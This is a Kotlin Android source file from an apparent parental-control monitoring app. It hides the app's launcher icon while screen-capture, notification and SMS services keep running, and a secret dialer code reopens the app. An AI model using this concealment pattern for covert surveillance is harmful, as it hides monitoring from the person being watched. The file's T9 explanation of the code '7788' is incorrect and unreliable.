package com.screenporter.companion.stealth

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.screenporter.companion.util.PreferencesManager

/**
 * StealthManager — controla a visibilidade do ícone da app na gaveta de aplicações.
 *
 * COMO FUNCIONA:
 *  - O ícone do launcher é exposto via uma <activity-alias> (em vez da activity principal
 *    diretamente). Esta alias pode ser activada/desactivada em runtime com
 *    PackageManager.setComponentEnabledSetting().
 *  - Quando desactivada, o ícone desaparece da gaveta de apps e do ecrã inicial,
 *    mas a app continua instalada e todos os serviços em background continuam a correr
 *    (CaptureService, NotificationListener, SmsReceiver, BootReceiver, etc.).
 *  - Para reabrir a app quando o ícone está escondido, o pai marca um código secreto
 *    no dialer do telemóvel (ex: *#*#7788#*#*). O [SecretCodeReceiver] intercepta
 *    esse código e lança a MainActivity.
 *
 * NOTA LEGAL:
 *  - Esta funcionalidade destina-se a controlo parental consentido (LGPD/GDPR/COPPA).
 *  - A app NÃO se esconde da lista de "apps administradoras do dispositivo" nem das
 *    "serviços de acessibilidade" — continua visível para auditoria. Apenas o ícone
 *    do launcher é removido, para que a criança não desinstale por curiosidade.
 *  - Apenas o pai (com código secreto) consegue reabrir a UI.
 */
class StealthManager(
    private val context: Context,
    private val prefs: PreferencesManager,
) {

    companion object {
        private const val TAG = "SP-Stealth"

        /**
         * Nome qualificado da activity-alias do launcher, conforme declarado no
         * AndroidManifest.xml. Deve coincidir com o `android:name` da alias.
         */
        const val LAUNCHER_ALIAS = "com.screenporter.companion.LauncherAlias"

        /**
         * Código secreto que o pai marca no dialer para reabrir a app quando
         * o ícone está escondido. Marcas: *#*#7788#*#*
         *
         * 7788 = "SP" no teclado T9 (S=7, P=7 → 77, 88). Fácil de memorizar.
         * Pode ser alterado remotamente via prefs (KEY_STEALTH_SECRET_CODE).
         */
        const val DEFAULT_SECRET_CODE = "7788"
    }

    /** Código secreto actual (pode ser personalizado). */
    val secretCode: String
        get() = prefs.stealthSecretCode.ifEmpty { DEFAULT_SECRET_CODE }

    /** True se o modo oculto está actualmente activado (ícone escondido). */
    fun isHidden(): Boolean {
        val pm = context.packageManager
        val enabled = pm.getComponentEnabledSetting(ComponentName(context.packageName, LAUNCHER_ALIAS))
        // ENABLED  = visível (alias activa) → modo normal
        // DISABLED = escondido (alias inactiva) → modo stealth
        return enabled == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    /**
     * Esconde o ícone da app da gaveta e do ecrã inicial.
     * A app continua a correr em background — apenas a entrada do launcher desaparece.
     *
     * @return true se a operação foi bem-sucedida.
     */
    fun hide(): Boolean {
        return try {
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                ComponentName(context.packageName, LAUNCHER_ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )
            prefs.stealthEnabled = true
            Log.i(TAG, "Modo oculto ACTIVADO — ícone removido do launcher")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao activar modo oculto", e)
            false
        }
    }

    /**
     * Repõe o ícone da app na gaveta e no ecrã inicial.
     * Normalmente só usado pelo pai (via UI) ou para diagnóstico.
     *
     * @return true se a operação foi bem-sucedida.
     */
    fun show(): Boolean {
        return try {
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                ComponentName(context.packageName, LAUNCHER_ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP,
            )
            prefs.stealthEnabled = false
            Log.i(TAG, "Modo oculto DESACTIVADO — ícone reposto no launcher")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao desactivar modo oculto", e)
            false
        }
    }

    /** Alterna entre visível e escondido. Devolve o novo estado (true = escondido). */
    fun toggle(): Boolean {
        return if (isHidden()) {
            show()
            false
        } else {
            hide()
            true
        }
    }
}
